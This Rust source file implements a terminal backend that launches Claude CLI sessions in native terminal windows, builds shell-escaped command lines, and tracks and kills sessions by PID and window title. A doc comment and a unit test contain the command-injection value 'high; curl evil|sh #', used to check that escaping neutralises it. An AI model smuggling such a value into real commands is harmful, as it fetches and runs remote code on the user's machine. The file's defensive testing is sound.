//! Native terminal backend
//!
//! Spawns sessions in native terminal windows (kitty, alacritty, etc.)
//! using xdg-terminal-exec or fallback detection.

mod detection;
mod pid_tracking;
mod spawner;
mod window_ops;

use anyhow::{bail, Context, Result};
use shell_escape::escape;
use std::borrow::Cow;
use std::path::{Path, PathBuf};
use std::process::Command;

use crate::claude::find_claude_path;
use crate::models::session::{Session, SessionType};
use crate::models::stage::Stage;
use crate::models::worktree::Worktree;

pub use detection::detect_terminal;
pub use pid_tracking::{cleanup_stage_files, create_wrapper_script, read_pid_entry, read_pid_file};
pub use spawner::spawn_in_terminal;
pub use window_ops::{close_window_by_title, window_exists_by_title};
#[cfg(target_os = "macos")]
pub use window_ops::{close_window_by_title_for_terminal, window_exists_by_title_for_terminal};

fn close_window_for_terminal(title: &str, terminal: &super::emulator::TerminalEmulator) -> bool {
    #[cfg(target_os = "macos")]
    {
        close_window_by_title_for_terminal(title, terminal)
    }

    #[cfg(not(target_os = "macos"))]
    {
        let _ = terminal;
        close_window_by_title(title)
    }
}

fn window_exists_for_terminal(title: &str, terminal: &super::emulator::TerminalEmulator) -> bool {
    #[cfg(target_os = "macos")]
    {
        window_exists_by_title_for_terminal(title, terminal)
    }

    #[cfg(not(target_os = "macos"))]
    {
        let _ = terminal;
        window_exists_by_title(title)
    }
}

/// Build the `claude` invocation string shared by all native spawn sites.
///
/// Produces `"{claude_path} --model {model} --effort {effort} {escaped_prompt}[ --remote-control]"`.
/// The `--remote-control` flag is appended only when `remote_control_enabled`
/// is true — `claude --remote-control` exits non-zero when its prerequisites
/// are unmet, so it must never be passed unconditionally.
///
/// `--remote-control [name]` takes an *optional* argument. It MUST come after
/// the positional prompt: placed before it, the arg parser swallows the
/// prompt as the RC session name and claude starts with no initial prompt
/// (the session sits idle / "stuck").
///
/// `claude_path`, `model`, and `effort` are passed RAW and shell-escaped here.
/// This is a command-construction trust boundary: a model like `opus[1m]`
/// would otherwise be glob-expanded by the shell, and a tampered effort such
/// as `high; curl evil|sh #` would be command injection. `escaped_prompt` is
/// pre-escaped by the caller (it is built from a trusted signal path).
fn build_claude_command(
    claude_path: &str,
    model: &str,
    effort: &str,
    remote_control_enabled: bool,
    escaped_prompt: &str,
) -> String {
    let claude_path = escape(Cow::Borrowed(claude_path));
    let model = escape(Cow::Borrowed(model));
    let effort = escape(Cow::Borrowed(effort));
    let remote_control_flag = if remote_control_enabled {
        " --remote-control"
    } else {
        ""
    };
    format!("{claude_path} --model {model} --effort {effort} {escaped_prompt}{remote_control_flag}")
}

/// Native terminal backend - spawns sessions in native terminal windows
pub struct NativeBackend {
    /// The terminal emulator to use
    terminal: super::emulator::TerminalEmulator,
    /// The .work directory path for PID tracking
    work_dir: PathBuf,
}

impl NativeBackend {
    /// Create a new native backend, detecting the available terminal
    pub fn new(work_dir: PathBuf) -> Result<Self> {
        let terminal = detect_terminal()?;
        // Log the detected terminal for debugging terminal selection issues
        eprintln!("Detected terminal: {}", terminal.display_name());
        Ok(Self { terminal, work_dir })
    }

    /// Get the detected terminal emulator
    pub fn terminal(&self) -> &super::emulator::TerminalEmulator {
        &self.terminal
    }

    /// Returns `(window_title, pid_file_key)` for a session.
    ///
    /// - `window_title` is the session's `tracking_key` (`loom-[<kind>-]<id>`),
    ///   matched EXACTLY against OS window titles (O-5).
    /// - `pid_file_key` is `tracking_key + session.id` — the per-session key the
    ///   spawn path used to name the PID file, so two consecutive sessions for
    ///   the same stage never collide (O-14).
    ///
    /// Falls back to the bare stage id for legacy sessions with no
    /// `tracking_key`.
    fn window_title_and_pid_key(session: &Session) -> Option<(String, String)> {
        let title = if !session.tracking_key.is_empty() {
            session.tracking_key.clone()
        } else {
            format!("loom-{}", session.stage_id.as_ref()?)
        };
        let pid_key = format!("{}-{}", title, session.id);
        Some((title, pid_key))
    }

    pub fn spawn_session(
        &self,
        stage: &Stage,
        worktree: &Worktree,
        session: Session,
        signal_path: &Path,
    ) -> Result<Session> {
        self.spawn(
            SessionType::Stage,
            stage,
            session,
            signal_path,
            &worktree.path,
            true,
        )
    }

    pub fn spawn_merge_session(
        &self,
        stage: &Stage,
        session: Session,
        signal_path: &Path,
        repo_root: &Path,
    ) -> Result<Session> {
        self.spawn(
            SessionType::Merge,
            stage,
            session,
            signal_path,
            repo_root,
            false,
        )
    }

    pub fn spawn_base_conflict_session(
        &self,
        stage: &Stage,
        session: Session,
        signal_path: &Path,
        repo_root: &Path,
    ) -> Result<Session> {
        self.spawn(
            SessionType::BaseConflict,
            stage,
            session,
            signal_path,
            repo_root,
            false,
        )
    }

    pub fn spawn_knowledge_session(
        &self,
        stage: &Stage,
        session: Session,
        signal_path: &Path,
        repo_root: &Path,
    ) -> Result<Session> {
        self.spawn(
            SessionType::Knowledge,
            stage,
            session,
            signal_path,
            repo_root,
            false,
        )
    }

    /// Unified spawn for every native session type.
    ///
    /// The per-kind variation (window title / PID-file key prefix, prompt,
    /// model/effort source, working directory) is derived from `kind` and the
    /// session's `tracking_key`, collapsing what used to be four ~85% identical
    /// methods (A-12 / D-3). The four public `spawn_*` methods are thin
    /// wrappers so out-of-cluster callers keep their signatures.
    ///
    /// * `kind` — selects the prompt and the model/effort policy.
    /// * `cwd` — the directory the wrapper `cd`s into and the terminal spawns
    ///   from (the worktree for stage sessions, the repo root otherwise).
    /// * `set_worktree_path` — only stage sessions record a worktree path; the
    ///   others run in the main repo.
    fn spawn(
        &self,
        kind: SessionType,
        stage: &Stage,
        session: Session,
        signal_path: &Path,
        cwd: &Path,
        set_worktree_path: bool,
    ) -> Result<Session> {
        let cwd_str = cwd.to_str().ok_or_else(|| {
            anyhow::anyhow!(
                "Session working directory contains invalid UTF-8: {}",
                cwd.display()
            )
        })?;

        // Assign the stage first so `tracking_key` is set for the (stage, kind)
        // pair; the window title IS the tracking_key and the PID-file key is
        // derived from it. (Idempotent for knowledge sessions, which derived it
        // at construction.)
        let mut session = session;
        session.session_type = kind;
        session.assign_to_stage(stage.id.clone());

        // Window title and the stage-key portion of the wrapper's LOOM_STAGE_ID.
        // `tracking_key` is `loom-[<kind>-]<stage-id>`; stripping `loom-` yields
        // the value passed historically as the wrapper's stage id.
        let title = session.tracking_key.clone();
        let wrapper_stage_id = title.strip_prefix("loom-").unwrap_or(&title).to_string();

        // Per-session PID-file key (tracking_key + session.id) so two
        // consecutive sessions for the same stage never share a PID file (O-14).
        let pid_key = format!("{}-{}", title, session.id);

        // Build the kind-specific initial prompt.
        let signal_path_str = signal_path.to_string_lossy();
        let initial_prompt = match kind {
            SessionType::Stage => format!(
                "Read the signal file at {signal_path_str} and execute the assigned stage work. \
                 This file contains your assignment, tasks, acceptance criteria, \
                 and context files to read."
            ),
            SessionType::Merge => format!(
                "Read the merge signal file at {signal_path_str} and resolve the merge conflicts. \
                 This file contains the conflicting files, merge context, and resolution instructions."
            ),
            SessionType::BaseConflict => format!(
                "Read the base conflict signal file at {signal_path_str} and resolve the merge conflicts. \
                 This file contains the conflicting files from merging dependency branches, \
                 and instructions for resolution. After resolving, tell the user to run `loom retry {}`.",
                stage.id
            ),
            SessionType::Knowledge => format!(
                "Read the signal file at {signal_path_str} and execute the assigned knowledge gathering work. \
                 This file contains your assignment, tasks, acceptance criteria, \
                 and instructions for populating the knowledge base."
            ),
        };
        let escaped_prompt = escape(Cow::Borrowed(&initial_prompt));

        // Model/effort POLICY (kept explicit, not buried). Merge and
        // base-conflict resolution always run on the strongest model with
        // maximum deliberation regardless of the originating stage's settings;
        // stage and knowledge sessions use the stage's effective values.
        let (model, effort) = match kind {
            SessionType::Merge | SessionType::BaseConflict => ("opus[1m]", "xhigh"),
            SessionType::Stage | SessionType::Knowledge => {
                (stage.effective_model(), stage.effective_reasoning_effort())
            }
        };

        // Find claude's absolute path (needed for macOS where terminals don't inherit PATH).
        // build_claude_command shell-escapes the path, model, and effort (S-3).
        let claude_path = find_claude_path()?;
        let remote_control_enabled = crate::remote_control::resolve(&self.work_dir);
        let claude_cmd = build_claude_command(
            &claude_path.display().to_string(),
            model,
            effort,
            remote_control_enabled,
            &escaped_prompt,
        );

        // Create the wrapper script (writes PID + start-time before exec'ing
        // claude). `wrapper_stage_id` sets LOOM_STAGE_ID; `pid_key` names the
        // per-session PID file. Pass cwd so the script can cd there (macOS).
        let wrapper_path = pid_tracking::create_wrapper_script(
            &self.work_dir,
            &pid_key,
            &wrapper_stage_id,
            &session.id,
            &claude_cmd,
            Some(cwd),
        )?;

        // Build the command that runs the wrapper script.
        // IMPORTANT: Use absolute path because macOS terminals open in home directory.
        let wrapper_path_abs = wrapper_path.canonicalize().unwrap_or(wrapper_path);
        let wrapper_cmd = wrapper_path_abs.to_string_lossy();

        // Spawn the terminal with PID tracking constrained by this session's
        // LOOM_SESSION_ID marker (O-14).
        let pid = spawn_in_terminal(
            &self.terminal,
            &title,
            Path::new(cwd_str),
            &wrapper_cmd,
            Some(&self.work_dir),
            Some(&pid_key),
            Some(&session.id),
        )?;

        // Update the session with spawn info.
        if set_worktree_path {
            session.set_worktree_path(cwd.to_path_buf());
        }
        session.set_pid(pid);
        session.try_mark_running()?;

        Ok(session)
    }

    pub fn kill_session(&self, session: &Session) -> Result<()> {
        // Resolve the window title and PID-file key for this session,
        // preferring the session's tracking_key so that merge/knowledge/
        // base-conflict sessions (which use prefixed titles and keys) are
        // killed correctly, not just bare stage sessions.
        let resolved = Self::window_title_and_pid_key(session);

        // First, try to close the window by title (more reliable for all terminals).
        // This approach works correctly even for terminal emulators like gnome-terminal
        // that use a server process, where killing by PID would kill all windows.
        if let Some((title, pid_key)) = &resolved {
            if close_window_for_terminal(title, &self.terminal) {
                // Clean up tracking files after closing the window
                cleanup_stage_files(&self.work_dir, pid_key);
                return Ok(());
            }
        }

        // Fallback to PID-based killing for terminals where window title closing
        // didn't work (e.g., no wmctrl/xdotool installed, or window already closed).
        // This works correctly for terminals like kitty/alacritty where each window
        // has its own process.
        //
        // Determine which PID to signal. Prefer the per-session PID file because
        // it carries the recorded start-time: if the PID was recycled by an
        // unrelated process, the entry no longer matches and we must NOT signal
        // it (O-14 — never SIGTERM a stranger). Fall back to `session.pid` only
        // when there is no PID-file evidence to the contrary.
        let pid_to_kill = match resolved.as_ref() {
            Some((_, pid_key)) => match read_pid_entry(&self.work_dir, pid_key) {
                Some(entry) if pid_tracking::pid_matches_entry(&entry) => Some(entry.pid),
                // PID file present but mismatched/dead → reused or gone; do not kill.
                Some(_) => None,
                // No PID file → fall back to the session's stored PID.
                None => session.pid,
            },
            None => session.pid,
        };

        if let Some(pid) = pid_to_kill {
            // Send SIGTERM to the process
            let output = Command::new("kill")
                .arg("-TERM")
                .arg(pid.to_string())
                .output()
                .context("Failed to kill session process")?;

            if !output.status.success() {
                // Process might already be dead, which is fine
                let stderr = String::from_utf8_lossy(&output.stderr);
                if !stderr.contains("No such process") {
                    bail!("Failed to kill process {pid}: {stderr}");
                }
            }
        }

        // Clean up tracking files regardless of whether a process was signaled.
        if let Some((_, pid_key)) = &resolved {
            cleanup_stage_files(&self.work_dir, pid_key);
        }
        Ok(())
    }

    pub fn is_session_alive(&self, session: &Session) -> Result<bool> {
        // Layered approach to checking if session is alive:
        // 1. Try reading from PID file (most current)
        // 2. Check if that PID is alive
        // 3. Fallback to stored session.pid
        // 4. Fallback to window existence check

        // Resolve the window title and PID-file key, preferring the
        // session's tracking_key so prefixed sessions resolve correctly.
        let resolved = Self::window_title_and_pid_key(session);

        // First, try the per-session PID file. Verify BOTH liveness and the
        // recorded process start-time so a recycled PID (an unrelated process
        // that inherited the dead session's PID) is not reported as alive (O-14).
        if let Some((_, pid_key)) = &resolved {
            if let Some(entry) = read_pid_entry(&self.work_dir, pid_key) {
                if pid_tracking::pid_matches_entry(&entry) {
                    return Ok(true);
                }
                // PID file exists but the process is dead (or reused) - clean
                // up and continue checking.
                cleanup_stage_files(&self.work_dir, pid_key);
            }
        }

        // Fallback to the stored PID from the session, via the nix syscall
        // helper instead of spawning a `kill -0` subprocess (P-7).
        if let Some(pid) = session.pid {
            if crate::process::is_process_alive(pid) {
                return Ok(true);
            }
        }

        // Final fallback: check if window still exists
        if let Some((title, _)) = &resolved {
            if window_exists_for_terminal(title, &self.terminal) {
                return Ok(true);
            }
        }

        Ok(false)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    #[test]
    fn test_native_backend_creation() {
        // May fail if no terminal is available; we only assert that when a
        // terminal *is* available, construction succeeds.
        let temp_dir = TempDir::new().unwrap();
        let result = NativeBackend::new(temp_dir.path().to_path_buf());
        if let Ok(backend) = result {
            // Sanity: the constructed backend exposes its terminal emulator.
            let _ = backend.terminal();
        }
    }

    #[test]
    fn window_title_and_pid_key_for_stage_session() {
        let mut session = Session::new();
        session.assign_to_stage("worker-pool".to_string());
        let (title, pid_key) = NativeBackend::window_title_and_pid_key(&session).unwrap();
        // Title is the tracking_key, matched exactly against window titles.
        assert_eq!(title, "loom-worker-pool");
        // PID-file key is per-session: tracking_key + session.id (O-14).
        assert_eq!(pid_key, format!("loom-worker-pool-{}", session.id));
    }

    #[test]
    fn window_title_and_pid_key_for_merge_session() {
        let mut session = Session::new_merge("loom/feature".to_string(), "main".to_string());
        session.assign_to_stage("feature".to_string());
        let (title, pid_key) = NativeBackend::window_title_and_pid_key(&session).unwrap();
        assert_eq!(title, "loom-merge-feature");
        assert_eq!(pid_key, format!("loom-merge-feature-{}", session.id));
    }

    #[test]
    fn window_title_and_pid_key_for_knowledge_session() {
        let session = Session::new_knowledge("kb");
        let (title, pid_key) = NativeBackend::window_title_and_pid_key(&session).unwrap();
        assert_eq!(title, "loom-knowledge-kb");
        assert_eq!(pid_key, format!("loom-knowledge-kb-{}", session.id));
    }

    #[test]
    fn window_title_and_pid_key_for_base_conflict_session() {
        let mut session = Session::new_base_conflict("loom/_base/feature".to_string());
        session.assign_to_stage("feature".to_string());
        let (title, pid_key) = NativeBackend::window_title_and_pid_key(&session).unwrap();
        assert_eq!(title, "loom-base-conflict-feature");
        assert_eq!(
            pid_key,
            format!("loom-base-conflict-feature-{}", session.id)
        );
    }

    #[test]
    fn window_title_and_pid_key_legacy_fallback() {
        // Legacy session: empty tracking_key, falls back to the bare stage id.
        let mut session = Session::new();
        session.stage_id = Some("legacy".to_string());
        session.tracking_key = String::new();
        let (title, pid_key) = NativeBackend::window_title_and_pid_key(&session).unwrap();
        assert_eq!(title, "loom-legacy");
        assert_eq!(pid_key, format!("loom-legacy-{}", session.id));
    }

    #[test]
    fn window_title_and_pid_key_none_without_stage() {
        // No tracking_key and no stage_id → nothing to resolve.
        let session = Session::new();
        assert!(NativeBackend::window_title_and_pid_key(&session).is_none());
    }

    #[test]
    fn pid_key_distinct_per_session_for_same_stage() {
        // O-14(a): two consecutive sessions for the SAME stage must get
        // distinct PID-file keys, or liveness for the old session would read
        // the new session's PID.
        let mut s1 = Session::new();
        s1.assign_to_stage("auth".to_string());
        let mut s2 = Session::new();
        s2.assign_to_stage("auth".to_string());

        let (title1, key1) = NativeBackend::window_title_and_pid_key(&s1).unwrap();
        let (title2, key2) = NativeBackend::window_title_and_pid_key(&s2).unwrap();
        assert_eq!(title1, title2, "same stage → same window title");
        assert_ne!(key1, key2, "different session → different PID-file key");
    }

    #[test]
    fn prefix_sharing_stage_ids_get_distinct_titles() {
        // O-5: `auth` and `auth-tests` must resolve to distinct window titles
        // so kill/liveness for one never targets the other.
        let mut auth = Session::new();
        auth.assign_to_stage("auth".to_string());
        let mut auth_tests = Session::new();
        auth_tests.assign_to_stage("auth-tests".to_string());

        let (auth_title, _) = NativeBackend::window_title_and_pid_key(&auth).unwrap();
        let (auth_tests_title, _) = NativeBackend::window_title_and_pid_key(&auth_tests).unwrap();
        assert_eq!(auth_title, "loom-auth");
        assert_eq!(auth_tests_title, "loom-auth-tests");
        assert_ne!(auth_title, auth_tests_title);
        // The exact-match window ops (tested in window_ops.rs) ensure
        // `loom-auth` never matches `loom-auth-tests`.
    }

    #[test]
    fn build_claude_command_omits_remote_control_when_disabled() {
        let cmd = build_claude_command("/usr/bin/claude", "opus[1m]", "xhigh", false, "'prompt'");
        // The model `opus[1m]` is shell-escaped (the `[` `]` are glob chars),
        // so it is single-quoted rather than left bare (S-3).
        assert_eq!(
            cmd,
            "/usr/bin/claude --model 'opus[1m]' --effort xhigh 'prompt'"
        );
        assert!(!cmd.contains("--remote-control"));
    }

    #[test]
    fn build_claude_command_appends_remote_control_when_enabled() {
        let cmd = build_claude_command("/usr/bin/claude", "sonnet", "high", true, "'prompt'");
        // `sonnet`/`high`/`/usr/bin/claude` contain only shell-safe chars, so
        // escaping leaves them unquoted.
        assert_eq!(
            cmd,
            "/usr/bin/claude --model sonnet --effort high 'prompt' --remote-control"
        );
        // The flag must sit AFTER the prompt positional, otherwise
        // `--remote-control [name]` swallows the prompt as its optional arg.
        let rc_idx = cmd.find("--remote-control").unwrap();
        let prompt_idx = cmd.find("'prompt'").unwrap();
        assert!(prompt_idx < rc_idx);
    }

    #[test]
    fn build_claude_command_escapes_effort_injection() {
        // S-3: a tampered reasoning effort must be neutralized, not interpolated
        // raw into the exec'd command line.
        let cmd = build_claude_command(
            "/usr/bin/claude",
            "sonnet",
            "high; curl evil|sh #",
            false,
            "'prompt'",
        );
        // The whole effort token is single-quoted, so no `;`/`|`/`#` is active.
        assert!(cmd.contains("--effort 'high; curl evil|sh #'"));
        assert!(!cmd.contains("--effort high; curl"));
    }

    #[test]
    fn build_claude_command_escapes_claude_path_with_spaces() {
        // S-3: a claude path containing spaces must be quoted so the wrapper's
        // `exec` doesn't split it into multiple words.
        let cmd = build_claude_command("/opt/My Tools/claude", "sonnet", "high", false, "'prompt'");
        assert!(cmd.starts_with("'/opt/My Tools/claude' --model sonnet"));
    }
}
